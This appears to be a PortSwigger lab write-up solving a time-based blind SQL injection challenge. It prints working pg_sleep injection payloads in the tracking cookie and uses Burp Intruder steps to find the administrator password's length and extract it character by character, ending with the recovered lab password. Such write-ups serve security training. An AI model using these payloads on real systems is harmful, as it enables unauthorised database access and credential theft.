## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/906132fb-aaaa-40a2-8bae-549e655fd736)


## Solution :

query made--

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'
```

#### Checking that it is vulnerable to blind sql injection  -

query changed--

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'' || pg_sleep(10)--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/a7e55875-624d-40cb-90b4-3ca17314936b)

Time delay of `20717`. SO it is vulnerable to blind sql injection.

#### Confirm that user table  present in the database-

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1)END)--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/678c0f24-fda6-40a5-a46a-60009b68ba05)

Time delay of `15990`.so it is valid query so now we can find whether user table  present in the database or not.here we used the negtive number `-1` because when it is false it won't cause any delay.

when i changed the value from `1=1` to `1=0` it should not cause any dealy lets check if it coming correct or not.

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'' || (SELECT CASE WHEN (1=0) THEN pg_sleep(10) ELSE pg_sleep(-1)END)--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/6570c398-8a56-495b-babe-c345920f734c)

Time delay of `725` which is very much less 10 sec and it didn't cause any delay.So it is valid query so now we can find whether user table  present in the database or not.

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''|| (SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(-1)END FROM users)--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/0883964a-228a-4954-a7ec-ed0777a7973d)

Time delay of `12559`.which is larger than 10 sec so now we know user table  present in the database.

#### finding the length of the password--

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''|| (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(-1)END FROM users)--
```
![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/50b23f29-6c26-4305-b909-b878d2861c94)

Time delay of `10719`.which is larger than 10 sec. So condition is true  length of the password is larger than `1`

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''|| (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>25) THEN pg_sleep(10) ELSE pg_sleep(-1)END FROM users)--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/4377c941-63fc-4134-ac0e-7ead36eba660)

Time delay of `725` which is less 10 sec. So condition is false  length of the password is smaller than `25`

```To find the length of the password send qury to  Intruder then and Add the password length part as payload and select attack type as SNIPER .Then go to  payload sleect payload type as numbers after that set from 1 to 25 and start the attack ```

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''|| (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>$1$) THEN pg_sleep(10) ELSE pg_sleep(-1)END FROM users)--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/4829c5e2-08cf-478a-8ee1-75f04dc10515)

`we also remove the default resource pool because it mess up with my time based sql injection code by adding create new resource pool and  tick the maximum concentration requests and set it as 1 and start attack.`

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/dd630b58-8799-4026-88e8-d80c852a0f10)

`After completing the attack go to coloum then click on response received`.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/69105943-3741-46f4-8db4-c82c963c8d82)

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/1f46ac1b-5841-4e3c-b826-29df928c0ca5)

From 20 onwards the Time delay is less than 10.So we can say that the length of the password is `20`

#### finding the password--

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''|| (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a')  THEN pg_sleep(10) ELSE pg_sleep(-1)END FROM users)--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/29c51a3a-d7df-458e-afb4-c3c2dc21d484)

Time delay of `729` which is less 10 sec. So condition is false which means that a is not the first charactor of the password.

```To find the password send qury to  Intruder then and Add postion of password as payload1 and the string part as payload2 and select attack type as cluster bomb .Then go to  payload select payload1 type as numbers and set to 1 to 20 and select payload2 as  bruteforce set min and max =1  and also remove the default resource pool because it mess up with my time based sql injection code by adding create new resource pool and  tick the maximum concentration requests and set it as 1 and start attack. ```

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''|| (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,$1$,1)='$a$')  THEN pg_sleep(10) ELSE pg_sleep(-1)END FROM users)--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/cb0dc217-0dd1-4346-b30c-32d38eb2dd19)

 20 charactor password and there Time delay is larger than 10.payload 1 represents the order and payload2 represents the each charactor password.
 
![Screenshot 2024-02-06 023421](https://github.com/ananthan05/Portswigger_labs/assets/140697378/be25f0a5-4a1e-4c42-8a96-08ed4ce71d0f)

Araange the payload2 characters according to the payload1 numbers in the correct order .

Password  = `uzyksqlhkspbxvs9x9l1`

Successfully logged in administrator.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/ea93470e-b3d1-4274-8181-8ef6d6690962)



















